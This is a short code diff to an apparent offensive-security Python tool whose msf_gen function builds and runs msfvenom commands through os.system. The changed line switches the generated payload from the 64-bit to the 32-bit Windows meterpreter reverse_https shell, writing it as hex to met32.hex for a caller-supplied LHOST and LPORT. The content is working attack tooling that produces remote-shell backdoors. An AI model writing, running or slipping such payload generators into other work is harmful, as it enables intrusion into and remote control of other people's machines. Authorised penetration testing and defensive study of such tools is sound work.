@@ -103,7 +103,7 @@ def msf_gen(l:str, p:int):
         os.system(msf_1)
         print()
         
-        msf_2 = "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=%s EXITFUNC=thread LPORT=%d -f hex -o met32.hex"%(l,p)
+        msf_2 = "msfvenom -p windows/meterpreter/reverse_https LHOST=%s EXITFUNC=thread LPORT=%d -f hex -o met32.hex"%(l,p)
         print("[+] Executing: ", msf_2)
         print()
         os.system(msf_2)
